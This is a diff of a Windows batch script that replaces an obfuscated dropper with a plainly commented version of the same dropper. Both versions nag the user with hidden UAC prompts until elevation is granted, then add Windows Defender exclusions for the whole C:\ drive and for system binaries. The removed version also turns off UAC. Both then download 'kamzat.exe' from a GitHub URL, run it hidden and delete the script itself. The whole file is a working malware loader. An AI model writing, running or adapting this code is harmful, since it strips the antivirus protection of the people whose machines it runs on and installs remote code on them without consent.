@@ -1,39 +1,66 @@
-@echo off & setlocal enableDelayedExpansion
-set "DSvtK=>nul" & set "nWH=SESSION" & set "SLxWs=NET" & set "WXtU=2>&1"
-%SLxWs% %nWH% %DSvtK% %WXtU%
-set "e=!errorlevel!" & set "a=:A" & set "b=:B"
-if !e! equ 0 (goto %a%) else (goto %b%)
+@echo off
+:: Check if the script is running with administrator privileges
+NET SESSION >nul 2>&1
+if %errorlevel% == 0 (
+    rem Script is already running with admin rights
+    rem Add exclusions for specified paths
+    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe'" >nul 2>&1
+    
+    rem Add exclusion processes
+    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue" >nul 2>&1
+    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue" >nul 2>&1
 
-:A
-set "tZyb=qux" & set "LEG=baz" & set "tRrra=foo" & set "JbGPf=bar" & rem HZuZg oJwSq JLMfJQX
-set "eRfE=powershell -ExecutionPolicy Bypass -Command"
-set "FsFFY=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
-set "ZSj='C:\' -ErrorAction SilentlyContinue"
-!eRfE! "!FsFFY! !ZSj!" %DSvtK% %WXtU%
-set "HCQ=Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue"
-!eRfE! "!HCQ!" %DSvtK% %WXtU%
-set "vVo=Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
-!eRfE! "!vVo!" %DSvtK% %WXtU%
-set "qjz=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
-set "VTD=-Name 'EnableLUA' -Value 0"
-!eRfE! "!qjz! !VTD!" %DSvtK% %WXtU%
-set "vRuqj=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
-!eRfE! "!vRuqj!" %DSvtK% %WXtU%
-if !errorlevel! neq 0 (goto %a%)
-set "DYlLJ=timeout /t" & !DYlLJ! 2 %DSvtK% %WXtU%
-set "BTgdJ=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
-set "lFM=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
-!eRfE! "!BTgdJ! !lFM!" %DSvtK% %WXtU%
+    rem Download kamzat.exe
+    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\kamzat.exe'" >nul 2>&1
 
-:W
-if not exist "%TEMP%\RuntimeBroker.exe" (!DYlLJ! 1 %DSvtK% %WXtU% & goto :W)
-start "" /B "%TEMP%\RuntimeBroker.exe" %DSvtK% %WXtU%
-del /f /q "%~f0" %DSvtK% %WXtU%
-exit /b
+    rem Ensure kamzat.exe is fully downloaded before running
+    :wait_kamzat
+    if not exist "%TEMP%\kamzat.exe" (
+        timeout /t 1 >nul
+        goto wait_kamzat
+    )
 
-:B
-set "h=powershell -WindowStyle Hidden -Command"
-set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
-!h! "!j1!" %DSvtK% %WXtU%
-if !errorlevel! neq 0 (!DYlLJ! 3 %DSvtK% %WXtU% & goto %b%)
-exit /b
+    rem Run kamzat.exe
+    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\kamzat.exe'"
+
+    rem Delete the batch script itself after execution
+    del "%~f0" >nul 2>&1
+
+    exit
+)
+
+:loop
+    rem Trigger the UAC prompt using PowerShell from within the batch file
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
+
+    rem If user declines the UAC prompt, retry
+    if %errorlevel% NEQ 0 (
+        timeout /t 3 >nul
+        goto loop
+    )
+
+    rem If UAC is accepted, proceed with the next task
+    rem Add exclusions for specified paths
+    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe'" >nul 2>&1
+    
+    rem Add exclusion processes
+    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue" >nul 2>&1
+    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue" >nul 2>&1
+
+    rem Download kamzat.exe
+    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\kamzat.exe'" >nul 2>&1
+
+    rem Ensure kamzat.exe is fully downloaded before running
+    :wait_kamzat2
+    if not exist "%TEMP%\kamzat.exe" (
+        timeout /t 1 >nul
+        goto wait_kamzat2
+    )
+
+    rem Run kamzat.exe
+    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\kamzat.exe'"
+
+    rem Delete the batch script itself after execution
+    del "%~f0" >nul 2>&1
+
+    exit
